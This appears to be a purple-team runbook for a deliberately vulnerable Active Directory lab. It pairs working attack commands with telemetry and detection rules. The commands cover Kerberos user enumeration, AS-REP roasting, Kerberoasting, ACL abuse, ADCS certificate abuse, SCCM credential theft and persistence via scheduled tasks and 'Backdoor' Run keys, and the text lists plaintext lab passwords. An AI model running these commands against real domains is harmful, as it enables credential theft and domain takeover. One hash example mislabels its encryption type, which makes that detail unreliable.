|-------|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active (stealth/alt) | ✅ Active (stealth/alt) |
| **Technique** | Golden Ticket + SID History | Silver Ticket (targeted) | Diamond Ticket (stealth) |
| **What it does** | Forge TGT with child krbtgt; inject root EA SID via ExtraSids | Forge service-specific TGS — no KDC contact | Modify legit TGT rather than forge |
| **Playbook** | `00-domain-deploy.yml` — parent-child trust (no SID filtering) | N/A — requires any service NTHASH | N/A |
| **Prerequisite** | Child krbtgt + child SID + root EA SID | Service account NTHASH | krbtgt AES256 + legit TGT |
| **What it earns** | EA in cadre.local → root krbtgt | Limited to specific service | Same as golden but stealthier |
| **Key telemetry** | WE 4624/4672 (EA logon); Zeek kerberos.log | No AS-REQ/AS-REP traffic | Legit TGT origin — fewer anomalies |

#### G — Persistence (WT088, WT089)

| Field | WT088 | WT089 |
|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active |
| **Stream** | MITRE Gap — G |
| **Att&ck** | T1053.005 (Scheduled Task) | T1547.001 (Registry Run Key) |
| **What it does** | `schtasks /create /tn "Persist" /tr "powershell..." /sc onlogon /ru SYSTEM` | `reg add HKLM\...\Run /v Backdoor /t REG_SZ /d "powershell..."` |
| **Key telemetry** | WE 4698; SyEID 1 (schtasks.exe) | WE 4688 (reg.exe); SyEID 12-13; Endpt registry |

### Phase 8 — Cross-Forest + External Domain (WT033-039)

#### WT033 — Cross-Forest Kerberoast

| Field | Value |
|-------|-------|
| **WT#** | 033 |
| **Status** | ✅ Active |
| **Technique** | Cross-forest Kerberoast via forest trust |
| **What it does** | From cadre.local DA, request TGS for range.local SPNs. Trust handles cross-forest referral. |
| **Playbook** | `00-domain-deploy.yml` — forest trust cadre ↔ range |
| **What it earns** | `s3rv1c3_SCCM!` (svc_sccm — SCCM Full Admin) |
| **Key telemetry** | WE 4769 (cross-realm TGS); Zeek kerberos.log (cross-realm); Suri SID:1000015 |

#### WT034 — SCCM NAA Extraction

| Field | Value |
|-------|-------|
| **WT#** | 034 |
| **Status** | ✅ Active |
| **Technique** | SCCM NAA credential extraction |
| **What it does** | With svc_sccm as SCCM Full Admin, extract NAA cred from site DB. `svc_naa` is DA in range.local (over-privileged). |
| **Playbook** | `10-sccm-verify.yml` — NAA config + over-privilege. ACE#23 alternative bridge. |
| **ACE#** | 23 (analyst_osint → svc_naa: GenericAll) |
| **What it earns** | `N@A_s3rv1c3!` → Domain Admin range.local → DCSync dc03 → all 3 domains |
| **Key telemetry** | WE 4624, 4688 (SharpSCCM); SyEID 1, 3 (SQL to SCCM DB); PS 4104 |

#### SCCM Chain (WT035-039)

| Field | WT035 | WT036 | WT037 | WT038 | WT039 |
|-------|-------|-------|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active | ✅ Active | ✅ Active | ✅ Active |
| **Technique** | PXE Boot Abuse | Client Push Relay | CMPivot Abuse | App Deployment | Site Takeover |
| **What it does** | Extract boot image + task seq vars | Relay client push to SMB | Arbitrary queries on all clients | Deploy malicious app to all | Execute on site server |
| **Playbook** | `10-sccm-verify.yml` — all SCCM features | — | — | — | — |
| **Prerequisite** | `svc_sccm` as SCCM Full Admin | — | — | — | — |
| **Key telemetry** | SyEID 1, 3, 11; Zeek smb.log, http.log | — | — | — | — |

#### Auxiliary (WT030, WT049)

| Field | WT030 | WT049 |
|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active |
| **Technique** | WSUS Abuse | VSC Enrollment |
| **Domain** | range.local | range.local |

#### G — Collection (WT091, WT092)

| Field | WT091 | WT092 |
|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active |
| **Stream** | MITRE Gap — G |
| **Att&ck** | T1074 (Data Staged) | T1113 (Screen Capture) |
| **What it does** | `robocopy C:\Shares\restricted C:\Temp\staging *.docx *.xlsx *.pdf /S` | PowerShell keylogger |
| **Key telemetry** | SyEID 11 (file create); Endpt file | Endpt API (keyboard hooks); SyEID 1 (PS) |

---

## Branch A: ACL Abuse (cadre.local)

**Diverges from:** Phase 4 (BH reveals ACEs). **Converges to:** Phase 5+. **Prerequisite:** Any cadre.local domain credential.

### WT015 — ForceChangePassword (Fastest to DA)

| Field | Value |
|-------|-------|
| **WT#** | 015 |
| **ACE#** | 7 (hunter_dfir → chief_command: ForceChangePassword) |
| **Playbook** | `05-ad-attack-surface.yml` |
| **From** | provisioning → dc01 (.10) |
| **What it earns** | `C0mm@nd_Ch1ef!` → Domain Admin cadre.local |
| **Key telemetry** | WE 4738 (password change), 4724, 4624; Zeek ldap.log |

### WT013 — WriteDacl Self-Escalate

| Field | Value |
|-------|-------|
| **WT#** | 013 |
| **ACE#** | 3 (Engineering-Cadre → Red-Cadre: WriteDacl) |
| **Technique** | Grant GenericAll to self on Red-Cadre, then add self as member |

### WT014 — GenericWrite → Shadow Credentials

| Field | Value |
|-------|-------|
| **WT#** | 014 |
| **ACE#** | 4 (Cloud-Cadre → Agentic-Cadre: GenericWrite) |
| **Technique** | Add KeyCredentialLink to group member, PKINIT auth |

### WT016 — GenericAll on OU

| Field | Value |
|-------|-------|
| **WT#** | 016 |
| **ACE#** | 5 (analyst_dfir → OU=Command: GenericAll) |
| **What it does** | `analyst_dfir` resets `chief_command`'s password via OU inheritance |

### WT023 — GPO Abuse

| Field | Value |
|-------|-------|
| **WT#** | 023 |
| **Att&ck** | T1484 (Group Policy Modification) |
| **ACE#** | 1 (analyst_cloud → Vulnerable-GPO: GpoEditDeleteModifySecurity) |
| **What it does** | Modify Vulnerable-GPO (linked to OU=Command) → code exec as `chief_command` |
| **Key telemetry** | WE 4688; SyEID 1; Endpt process |

### WT024 — gMSA Extraction

| Field | Value |
|-------|-------|
| **WT#** | 024 |
| **Att&ck** | T1555.002 (gMSA) |
| **ACE#** | 10 (eng_cloud → gmsaTools$: ReadGMSAPassword) |

### WT027 — SPN Jacking (CVE-2026-25177)

| Field | Value |
|-------|-------|
| **WT#** | 027 |
| **ACE#** | 25 (analyst_malware → self: WriteProperty(SPN)) |
| **What it does** | Register homoglyph SPN to intercept TGS requests |

### WT008 — Shadow Credentials (dc01$)

| Field | Value |
|-------|-------|
| **WT#** | 008 |
| **ACE#** | 6 (ops_redcell → dc01$: GenericWrite) |
| **What it does** | KeyCredentialLink on dc01$ → authenticate as DC → DCSync |

### WT025 — AdminSDHolder Persistence

| Field | Value |
|-------|-------|
| **WT#** | 025 |
| **What it does** | GenericAll on AdminSDHolder → SDPROP propagates to all protected groups |

---

## Branch B: ADCS (WT050-062)

**Diverges from:** Phase 4. **Converges to:** Phase 7. **CA:** dc01.cadre.local — `cadre-CA`.

| ESC# | WT# | Vulnerability | What it earns |
|:----:|:---:|:--------------|:--------------|
| ESC1 | 050 | Manager approval=False + Enroll rights | DA certificate |
| ESC2 | 051 | Any purpose EKU + enroll rights | DA cert |
| ESC3 | 052 | Enrollment agent + OID mismatch | Any user cert |
| ESC4 | 053 | Template ACL Write | Template modification |
| ESC5 | 054 | CA object ACL | Full CA control |
| ESC6 | 055 | EDITF_ATTRIBUTESUBJECTALTNAME2 | SAN abuse |
| ESC7 | 056 | CA Manager bypass | Approve own request |
| ESC8 | 057 | NTLM relay to ADCS Web enroll | Machine certs |
| ESC9 | 058 | No security extension + weak mapping | Alt security ID |
| ESC10 | 059 | Weak cert mapping registry | Logon as DA |
| ESC11 | 060 | No PKIInitiateRequest protection | Cert via RPC |
| ESC13 | 061 | OID-to-group mapping | EA via cert |
| ESC14 | 062 | Subject/altSecID mapping writable | Auth as target |

**Common pattern:**
```bash
certipy-ad req -ca cadre-CA -template ESC1-Template -upn administrator@cadre.local \
  -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -dc-ip 192.168.77.10
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.77.10
```

---

## Branch C: SCCM Escalation (WT034-039, WT030, WT049)

**Diverges from:** Phase 8 (cross-forest → svc_sccm). **Converges to:** Phase 8 (NAA → range DA).
**SCCM Site:** mbr02 (.23), site code `CAD`. **Tools:** SharpSCCM.

| WT# | Technique | Earning |
|:---:|:----------|:--------|
| 034 | NAA Extraction | Range DA (fastest) |
| 035 | PXE Boot Abuse | Task seq creds |
| 036 | Client Push Relay | SMB relay |
| 037 | CMPivot Abuse | Client query exec |
| 038 | App Deployment | All-client code exec |
| 039 | Site Takeover | Site server control |
| 030 | WSUS Abuse | WSUS push |
| 049 | VSC Enrollment | Cert enrollment |

---

## Branch D: Linux Pivot (WT044-048)

**Diverges from:** Phase 3 (MSSQL linked-server recon). **Converges to:** Phase 6.
**Target:** linux01 (192.168.77.40). Requires root.

| WT# | Phase | Technique | Playbook | What it earns |
|:---:|:-----:|:----------|:---------|:--------------|
| 044 | Entry | MSSQL linked-server recon | `16-supplychain.yml` — MSSQL on linux01 | SQL query access |
| 048 | Entry | Podman container escape | `07-linux-config.yml` — privileged podman | Root on linux01 |
| 045 | 2 | SSSD ticket extraction | N/A (standard LAD artifact) | Cached Kerberos tickets |
| 047 | 3 | NFS krb5p mount | `07-linux-config.yml` — NFS export | NFS share access |
| 046 | 4 | MSSQL keytab extraction | `07-linux-config.yml` — keytab | MSSQL service credential |

---

## Removed / Non-functional

| WT# | Reason |
|:---:|:-------|
| 028 | ❌ Invalid — SAMR null bind blocked by Server 2025 `RestrictAnonymousSAM=1` |
| 031 | ⏳ Pending relocation — valid technique, needs user list source |
| 018 | ❌ Non-functional — `\PIPE\efsrpc` blocked on Server 2025 |
| 019 | ❌ Non-functional — SMB-pipe DCE-RPC not detectable by Suricata 8.0.5 |
| 020 | ❌ Non-functional — MS-FSRVP service not available on Server 2025 |

---

## E — Network Defense Exercises (14 standalone)

> Run from linux01 or provisioning. Each triggers Suricata SID or Zeek notice. See `04-automation/campaign-e/`.

| WT# | SID/Notice | Index |
|:---:|:-----------|:------|
| 069 | SID:1000025 | `logs-suricata-*` |
| 070 | SID:1000026 | `logs-suricata-*` |
| 071 | SID:1000027 rev:2 | `logs-suricata-*`, `zeek.notice` |
| 072 | SID:1000028 | `logs-suricata-*` |
| 073 | SID:1000029 rev:2 | `logs-suricata-*` |
| 074 | SID:1000010 | `logs-suricata-*` |
| 075 | ET:2000012 | `logs-suricata-*` |
| 076 | ET:2000041 | `logs-suricata-*` |
| 077 | ET:2000070 | `logs-suricata-*` |
| 078 | ET:2000072 | `logs-suricata-*` |
| 079 | ET:2000060 | `logs-suricata-*` |
| 080 | Z9 (cadre-conn-beacon) | `zeek.notice` |
| 081 | Z1 (cadre-outbound) | `zeek.notice` |
| 093 | AES-256 encrypt | Sysmon EID 11, Endpt file |

## F — Supply-Chain Exercises (10 standalone)

> npm threat emulation on linux01. Detected via auditd + Zeek.

| F-# | Detection |
|:---:|:----------|
| F-01 | auditd process + Zeek HTTP POST |
| F-02 | auditd process + Zeek HTTP |
| F-03 | auditd file-watch |
| F-04 | auditd file-watch |
| F-05 | auditd process + Zeek |
| F-06 | auditd npm exec |
| F-07 | auditd process + Zeek HTTP |
| F-08 | auditd git commit hooks |
| F-09 | auditd bundle exec |
| F-10 | Zeek HTTP POST (custom rule) |
---

## Phase 0 — Reconnaissance (From Zero Credentials)

> **Status:** Steps 1-2 tested 2026-06-23; Steps 3-6 untested (require credentials)
> **Goal:** Identify valid domain users, network topology, and authentication surface without any credentials
> **Source:** `CAMPAIGNS.md` lines 94-281 (Phase 0 section)

### Phase 0 Step 1 — Full Port/Service Scan (nmap)

**Tested 2026-06-23.** nmap against all 7 VMs identified open ports and SMB signing requirements. Results in CAMPAIGNS.md table (lines 105-112).

#### Why it works
TCP/UDP port scan reveals attack surface — what services are listening, what versions, what OS. Critical for choosing attack vectors: SMB signing NOT required on member servers = NTLM relay viable; ADWS on 9389 = potential recon path.

#### Attack command
```bash
nmap -Pn -sV -sC -p- --min-rate 5000 -T4 192.168.77.10,11,12,22,23,40,50,51,55
```

#### What to expect (success)
```
Nmap scan report for 192.168.77.11
...
PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH ...
53/tcp    open   domain       (generic DNS response)
88/tcp    open   kerberos-sec Microsoft Kerberos
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft AD LDAP
445/tcp   open   microsoft-ds Microsoft Windows ...
...
```

#### What to expect (failure modes)
- `-Pn` skips host discovery (needed since DC firewalls may block ICMP). If you remove it, scans hang on "Host seems down".
- `--min-rate 5000` is aggressive. If you see "1+ hosts failed" or partial output, reduce to 1000.
- `p-` is full port scan. On slow networks this can take 10+ minutes.

#### CADRE-specific notes
- All 7 VMs use Vagrant-assigned MACs starting with `00:0C:29:...` (VMware)
- SMB signing **required** on all 3 DCs (192.168.77.10, .11, .12) — NTLM relay to DCs blocked
- SMB signing **NOT required** on mbr01 (.20), mbr02 (.23) — NTLM relay viable
- Member servers: MSSQL 2022 on mbr01 (.22), SCCM on mbr02 (.23)
- Linux: linux01 (.40) has MSSQL Linux + NFS + SSH

#### Telemetry fingerprint
- nmap scan appears in firewall logs on each scanned host
- IDS/IPS rules detect nmap service version probes (Suricata `ET SCAN` signatures)
- Windows Defender ATP alerts on internal port scans

#### Detection engineering
- Suricata `ET SCAN` signatures fire on SYN scans, NULL scans, XMAS scans
- Zeek `conn.log` shows connection attempts to all ports; `notice.log` for unusual patterns
- Elastic cadre-* rules should alert on internal port scans from non-admin sources

#### Common pitfalls
- Running without `-Pn` on lab VMs that block ICMP = silent failure
- Running on Windows host = nmap uses Npcap — may need admin privileges for raw packet capture
- Output is too long for terminal — use `nmap ... -oN /tmp/scan.txt` for file output

---

### Phase 0 Step 2 — Kerberos User Enumeration (nmap krb5-enum-users / kerbrute)

**Tested 2026-06-23.** nmap `krb5-enum-users` got `principal_unknown` for malformed cnames (nmap script bug bundles comma-separated users per cname). **AS-REP captured for `intern_blue`** which has `DONT_REQUIRE_PREAUTH`. kerbrute is the canonical replacement.

#### Why it works
Kerberos AS-REQ can be sent with a guessed `cname` and constant `sname=krbtgt/<realm>`. The KDC's response code reveals user validity:
- `preauth_required` (26) = user exists
- `principal_unknown` (6) = user doesn't exist
- AS-REP (msg-type 11) = user exists with DONT_REQUIRE_PREAUTH (AS-REP Roast target)

Modern Server 2025 KDC requires PA-ETYPE-INFO2 pre-auth (RFC 6806) which older nmap scripts may not send, causing uniform error responses. **kerbrute** sends modern pre-auth and works correctly.

#### Attack commands
```bash
# Broken on Server 2025 (nmap 7.99 bug — bundles comma-separated users per cname)
nmap -Pn -p 88 --script=krb5-enum-users \
  --script-args='krb5-enum-users.realm=child.cadre.local,userdb=/tmp/users.txt' \
  192.168.77.11

# Canonical replacement — works on Server 2025
kerbrute userenum -d child.cadre.local --dc 192.168.77.11 /tmp/users.txt

# Capture AS-REPs (Phase 1)
impacket-GetNPUsers child.cadre.local/ -dc-ip 192.168.77.11 -no-pass -usersfile /tmp/users.txt -format hashcat > /tmp/asrep.txt
```

#### What to expect (success — kerbrute)
```
[+] VALID USERNAME: administrator@child.cadre.local
[+] VALID USERNAME: guest@child.cadre.local
[+] VALID USERNAME: krbtgt@child.cadre.local
[+] VALID USERNAME: vagrant@child.cadre.local
[+] VALID USERNAME: intern_blue@child.cadre.local
[+] VALID USERNAME: analyst_t1@child.cadre.local
... (10+ valid users in ~10 seconds)
```

#### What to expect (failure modes)
- **nmap `krb5-enum-users` returns 0 users on Server 2025** — nmap 7.99 script bug + KDC hardened behavior. Use kerbrute.
- **kerbrute "all users invalid"** — verify `/tmp/users.txt` has 1 user per line; check network connectivity to DC
- **AS-REP for only one user (intern_blue)** — that's expected; intern_blue is the only DONT_REQUIRE_PREAUTH account in CADRE
- **TCP RST after 5 requests** — KDC rate limit; kerbrute handles this by opening new TCP connections

#### CADRE-specific notes
- `intern_blue` is the only DONT_REQUIRE_PREAUTH user — set by `05-ad-attack-surface.yml` lines 859-866
- All other users have preauth_required (default)
- `cadre_passwords.txt` (in `ansible/files/`) contains the lab passwords — use as wordlist
- 5 userdb lines from CAMPAIGNS.md produce 5 AS-REQ packets (nmap 7.99 bug treats each line as one cname)
- AS-REP etype observed: 23 (RC4-HMAC) → hashcat mode 18200

#### Telemetry fingerprint
- **WinSec 4768** (TGT request) per AS-REQ — high volume in short time = enumeration
- **WinSec 4625** (logon failure) NOT generated for AS-REQ without pre-auth (no actual auth attempt)
- **Zeek `kerberos.log`** captures every AS-REQ/AS-REP with cname, sname, error_code
- Suricata cadre-ad rules: SID:1000015 (Kerberoast burst) fires on rapid AS-REQ pattern

#### Detection engineering
- **Suricata SID:1000015** ("CADRE Kerberos AS-REQ burst") — fires on 5+ AS-REQs in 60s
- **Elastic cadre-001** (planned) — pattern match on Zeek kerberos.log for `error_code=6` from same source IP
- **Volume rule** — >50 Kerberos requests from single source in 5min = enumeration

#### Common pitfalls
- **`/tmp/users.txt` with trailing whitespace** — nmap may include whitespace in cname
- **kerbrute path not in PATH** — `wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute`
- **Realm typo** — `child.cadre.local` (lowercase) vs `CHILD.CADRE.LOCAL` (uppercase) — kerbrute auto-handles
- **AS-REQ gets principal_unknown for ALL users** — modern KDC; need modern tool (kerbrute)

#### Wireshark field reference
- Filter to specific user: `kerberos.cname contains "intern_blue"`
- Filter to AS-REPs only: `kerberos.msg_type == 11`
- Filter to errors only: `kerberos.msg_type == 30`
- Filter to preauth_required errors: `kerberos.error_code == 26`
- The `cname` field in the response = the `cname` in the request (proves which user was tested)
- `sname` is always `krbtgt/<REALM>` in AS-REQ/AS-REP

---

### Phase 0 Step 3 — ADWS Enumeration (port 9389) ⏳

**Status:** Not yet tested. Port 9389 confirmed open on all 3 DCs (nmap 2026-06-18).

#### Why it works
Active Directory Web Services (ADWS) provides SOAP-based enumeration on port 9389. Server 2025 may allow enumeration via ADWS even when LDAP anonymous is blocked — different authentication path.

#### Attack command (planned)
```bash
# From Kali
nmap -p 9389 --script=adws-enum 192.168.77.11
# OR use SOAPHound / adws-enum Python tools (requires auth for full functionality)
```

#### What to expect (success)
- Service detected: SOAP XML envelope accepted
- Returns DCInfo (forest, domain, sites) without auth
- Full user/group enumeration requires auth

#### What to expect (failure modes)
- SOAP 401 Unauthorized for full enumeration without creds
- Port 9389 filtered by firewall
- TLS required — verify with `openssl s_client -connect 192.168.77.11:9389`

#### CADRE-specific notes
- All 3 DCs (dc01, dc02, dc03) have ADWS on 9389 (per 04-vulnerabilities.yml)
- Will be tested once we have at least one valid credential

---

### Phase 0 Step 4 — DNS Enumeration via adidnsdump ⏳

**Status:** Not yet tested. Requires credentials.

#### Why it works
AD-integrated DNS allows any authenticated user to query all DNS records. adidnsdump enumerates the zone including records the user has no explicit read rights to. Useful for discovering:
- Cloud Sync endpoints
- Internal service records
- Unpublicized hosts not in BloodHound

#### Attack command (planned)
```bash
adidnsdump -u cadre.local\\intern_blue -p '1nt3rn_Blu3!' dc01.cadre.local
```

#### What to expect (success)
- `records.csv` and `zones/` directory created
- All A, AAAA, CNAME, MX records listed
- SOA record with primary DNS

#### CADRE-specific notes
- Will be tested after Phase 1 (intern_blue credential obtained)

---

### Phase 0 Step 5 — SAMR Enumeration ⏳

**Status:** Not yet tested. Requires credentials.

#### Why it works
SAMR (MS-SAMR over port 445) returns the same user data as LDAP but uses the RPC pipe that backup agents, inventory tools use daily — blends into baseline. Less likely to trigger LDAP-specific alerts.

#### Attack command (planned)
```bash
python3 samrdump.py cadre.local/intern_blue:'1nt3rn_Blu3!'@192.168.77.10
# OR via impacket: impacket-samrdump
```

#### What to expect (success)
- samAccountName, lastLogon (FILETIME), logonCount for every user
- Machine accounts (with `$` suffix)
- Works against any DC

#### CADRE-specific notes
- Will be tested after Phase 1
- Compare LDAP vs SAMR output to verify they're equivalent

---

### Phase 0 Step 6 — Honeypot Detection via lastLogon ⏳

**Status:** Not yet tested. Requires credentials.

#### Why it works
Honeytoken accounts are designed to detect interaction but are never authenticated. The `lastLogon` attribute exposes them:
- `lastLogon = 0` (or 12/31/1600) = never authenticated = honeypot
- Real privileged accounts always have authentication history
- Machine accounts with `lastLogon = 0` are impossible (domain join requires auth)

#### Attack command (planned)
```bash
# Via SAMR (less monitored)
python3 samrdump.py cadre.local/intern_blue:'1nt3rn_Blu3!'@192.168.77.10 | grep "Last Logon: 0"

# Via LDAP (noisier)
ldapsearch -x -H ldap://dc01.cadre.local -D "intern_blue@cadre.local" -w '1nt3rn_Blu3!' \
  -b "DC=cadre,DC=local" "(&(lastLogon=0)(!(objectClass=computer)))" sAMAccountName
```

#### What to expect (success)
- List of users with lastLogon=0
- These are either honeypots OR new accounts that have never logged in
- Cross-reference with `logonCount=0` to filter true honeypots

#### CADRE-specific notes
- Defer until after Phase 1
- Useful for purple-team detection engineering

---


---

## Mechanics: Phase 1 — Initial Access (WT003 AS-REP Roast)

**Tested 2026-06-23.** intern_blue AS-REP captured. Hash format `$krb5asrep$23$...` Crack via `hashcat -m 18200` yields `1nt3rn_Blu3!` (verifiable in `ansible/files/cadre_passwords.txt`).

### Why it works
AS-REP Roast is a pre-auth bypass exploit. The Kerberos protocol normally requires PA-ENC-TIMESTAMP (timestamp encrypted with the user's password key) BEFORE the KDC issues a TGT. If a user account has the `UF_DONT_REQUIRE_PREAUTH` flag (0x400000) in `userAccountControl`, the KDC skips this check and returns an AS-REP immediately. The AS-REP contains the TGT encrypted with the user's password key — the attacker can then crack it offline.

This is the only user in CADRE with this flag. The other 20+ users in `/tmp/users.txt` will not produce AS-REPs because they have preauth_required (default). The Phase 0 nmap run captured an AS-REP for intern_blue specifically because that was the one DONT_REQUIRE_PREAUTH account.

### Attack commands
```bash
# Step 1 — Capture AS-REP for all DONT_REQUIRE_PREAUTH users
impacket-GetNPUsers child.cadre.local/ -dc-ip 192.168.77.11 \
    -no-pass -usersfile /tmp/users.txt -format hashcat \
    > /tmp/asrep.txt

# Should produce only intern_blue (only DONT_REQUIRE_PREAUTH user in CADRE):
cat /tmp/asrep.txt
# $krb5asrep$23$intern_blue@CHILD.CADRE.LOCAL:a1b2c3d4e5f6...:$

# Step 2 — Crack with hashcat
hashcat -m 18200 /tmp/asrep.txt /path/to/cadre_passwords.txt
# Mode 18200 = AS-REP RC4-HMAC
# Expected: 1nt3rn_Blu3! (RC4-hmac — fast, seconds to minutes)
```

### What to expect (success)
```
$krb5asrep$23$intern_blue@CHILD.CADRE.LOCAL:3a1b4c...:$
1nt3rn_Blu3!

Session.Status...: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: /tmp/asrep.txt
Time.Estimated...: 0 secs
```

### What to expect (failure modes)
- **No AS-REP captured**: No user has `DONT_REQUIRE_PREAUTH` set. Verify with `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` (requires creds).
- **Hash doesn't crack with cadre_passwords.txt**: Password not in that wordlist. Use `rockyou.txt` or check the playbook.
- **impacket connection refused on port 88**: KDC firewall issue. Verify TCP/88 and UDP/88 reachable.
- **`principal_unknown` for intern_blue**: User moved or flag removed. Verify with BloodHound query.

### CADRE-specific notes
- `intern_blue` is in `OU=Detection,DC=child,DC=cadre,DC=local`
- Set by `05-ad-attack-surface.yml` lines 859-866: `Set-ADUser intern_blue -DoesNotRequirePreAuth $true`
- Password: `1nt3rn_Blu3!` (verifiable in `ansible/files/cadre_passwords.txt`)
- Domain: child.cadre.local
- Cross-domain: `intern_blue` is in CHILD domain, not root. Phase 2 uses ACE#18 to bridge to analyst_t2 (root domain user)

### Telemetry fingerprint
- **WinSec 4768** (A Kerberos authentication ticket (TGT) was requested): issued for intern_blue without 4624 preceding = preauth bypass signature
- **Zeek kerberos.log**: AS-REQ (msg_type 10) then AS-REP (msg_type 11) pair, cname=intern_blue
- **ETYPE 23 (ARCFOUR-HMAC-MD5)** in enc-part: indicates RC4 — weak crypto, fast crack
- **Single AS-REP per source IP in 5min** = high signal (normal Kerberos traffic is all preauth_required)

### Detection engineering
- **Suricata SID:1000015** ("CADRE Kerberos AS-REQ burst") — fires on 5+ AS-REQs in 60s
- **Suricata SID:2000002** (ET TROJAN Kerberos AS-REP Without Pre-Auth) — explicit AS-REP signal
- **Elastic rule (planned)**: `event_id:4768 AND user.name:intern_blue` without preceding `event_id:4624` within 5 min
- **Volume anomaly**: AS-REP from a single source IP when no other AS-REPs are normal = scan

### Common pitfalls
- **nmap krb5-enum-users + comma userdb**: nmap 7.99 bug bundles multiple users per cname. Use kerbrute for clean output.
- **Hashcat wrong mode**: `mode 18200` is for RC4 (etype 23). AES is mode 19700 (etype 17) or 19800 (etype 18). Check etype in Wireshark.
- **impacket version mismatch**: Newer impacket uses `-usersfile`; older uses `-userfile`. Check your version.
- **Cred cache stale**: `export KRB5CCNAME=...` between runs. Clear `/tmp/krb5cc*` if reusing.
- **Wrong DC IP**: Use the DC for the domain you're testing. intern_blue is in child.cadre.local → dc02 (192.168.77.11), not dc01.

### Wireshark field reference (AS-REP)
```
Kerberos
└─ as-rep
   ├─ pvno: 5
   ├─ msg-type: 11 (AS-REP)
   ├─ realm: CHILD.CADRE.LOCAL
   ├─ sname: krbtgt/CHILD.CADRE.LOCAL
   └─ enc-part
      ├─ etype: eTYPE-ARCFOUR-HMAC-MD5 (23)   ← RC4 = hashcat mode 18200
      ├─ kvno: 3
      └─ cipher: <HEX BYTES - the TGT encrypted with user key>
```

### Reproduction checklist
- [ ] `05-ad-attack-surface.yml` ran (intern_blue has DONT_REQUIRE_PREAUTH)
- [ ] `/tmp/users.txt` contains `intern_blue` (one per line is best)
- [ ] `impacket-GetNPUsers` runs without errors
- [ ] AS-REP appears for intern_blue only
- [ ] `hashcat -m 18200` cracks within minutes
- [ ] Cracked password matches expected `1nt3rn_Blu3!`

---


## Mechanics: Phase 2 — Credential Harvesting (WT002 AES Kerberoast via ACE#18)

**Tested 2026-06-04.** svc_mssql TGS hash captured + cracked to `s3rv1c3_MSSQL!`. Tracking details in `docs/internal/plan01-telemetry-catalog/phase1-source-matrix/tracker.md`.

### Why it works
Kerberoast attacks the Kerberos TGS (Ticket Granting Service) endpoint. Any account with an SPN (Service Principal Name) can request a TGS for that service. The TGS is encrypted with the SPN account's password key. If the password is weak, the TGS can be cracked offline.

CADRE's specific path:
1. `intern_blue` (low-priv, no preauth) has ACE#18 → `analyst_t2`: ForceChangePassword
2. Use ForceChangePassword to reset `analyst_t2`'s password (allowed by ACE)
3. Request TGT as `analyst_t2` (no longer blocked by preauth — analyst_t2 was never preauth-blocked, intern_blue's preauth-bypass is unrelated)
4. As `analyst_t2`, request TGS for `svc_mssql`'s SPN (`MSSQLSvc/mbr01.child.cadre.local:1433`)
5. TGS encrypted with svc_mssql's key → crack offline

This is a TWO-STEP attack: ACE abuse (Phase 2 prerequisite) + Kerberoast (Phase 2 execution).

### Attack commands
```bash
# Step 1 — Reset analyst_t2 password via ACE#18 (from intern_blue)
bloodyAD --host 192.168.77.11 -d child.cadre.local \
    -u intern_blue -p '1nt3rn_Blu3!' \
    set password "CN=analyst_t2,OU=Detection,DC=child,DC=cadre,DC=local" \
    'Pwn3d_T2!'

# Step 2 — Get TGT for analyst_t2 (using new password)
impacket-getTGT child.cadre.local/analyst_t2:'Pwn3d_T2!' \
    -dc-ip 192.168.77.11
export KRB5CCNAME=analyst_t2.ccache

# Step 3 — Request TGS for svc_mssql's SPN (AES Kerberoast)
impacket-GetUserSPNs child.cadre.local/analyst_t2 \
    -k -no-pass -dc-ip 192.168.77.11 \
    -request -outputfile child_tgs.txt
```

### What to expect (success)
```
$krb5tgs$23$*svc_mssql$CHILD.CADRE.LOCAL$mbr01.child.cadre.local*$abc123...$def456...
# (AES256 hash, mode 19700)

# Crack with hashcat
hashcat -m 19700 child_tgs.txt /path/to/cadre_passwords.txt
# Expected: s3rv1c3_MSSQL!
```

### What to expect (failure modes)
- **Step 1 fails with "Access Denied"**: ACE#18 not deployed. Verify `05-ad-attack-surface.yml` line 489-519 set up the ACE.
- **Step 2 fails with KDC_ERR_WRONG_REALM**: Wrong DC. Use dc02 (192.168.77.11) for child.cadre.local.
- **Step 3 returns no hashes**: analyst_t2's password reset didn't take effect. Re-run Step 1.
- **Hash doesn't crack**: Password not in wordlist. Try rockyou.txt.

### CADRE-specific notes
- ACE#18: `intern_blue → analyst_t2: ForceChangePassword` (set in `05-ad-attack-surface.yml:489-519`)
- ACE#18 is in the `child.cadre.local` domain only (intern_blue, analyst_t2 both in child)
- SPNs registered: `svc_mssql → MSSQLSvc/mbr01.child.cadre.local:1433` (line 827)
- `svc_mssql` is NOT sysadmin on mbr01 (discovered in Phase 3 testing — see WT041)
- The "AES" in the name means the TGS is encrypted with AES256 (etype 18) — use hashcat mode 19700, not 18200

### Telemetry fingerprint
- **WinSec 4738** (user account was changed): analyst_t2 password reset
- **WinSec 4769** (A Kerberos service ticket was requested): svc_mssql SPN requested by analyst_t2
- **WinSec 4624** (An account was successfully logged on): analyst_t2 TGT request
- **Zeek kerberos.log**: AS-REQ (TGT) then TGS-REQ (service) in sequence
- **Suricata SID:1000015**: Kerberoast burst pattern if rapid requests

### Detection engineering
- **Suricata SID:1000015**: 5+ AS-REQs/TGS-REQs from same source in 60s
- **Elastic rule**: `event_id:4738` followed by `event_id:4769` within 5 min, same user_name = suspicious
- **Volume rule**: SPN requests outside business hours = anomalous
- **Service account password entropy**: Low-entropy SPNs = Kerberoast-vulnerable

### Common pitfalls
- **Wrong DC**: intern_blue/analyst_t2 are in CHILD domain → dc02 (192.168.77.11), not dc01
- **Stale TGT cache**: After resetting password, old TGT is invalid. Re-export KRB5CCNAME.
- **AES vs RC4 confusion**: CAMPAIGNS.md says "mode 19700" (AES256) not "mode 18200" (RC4)
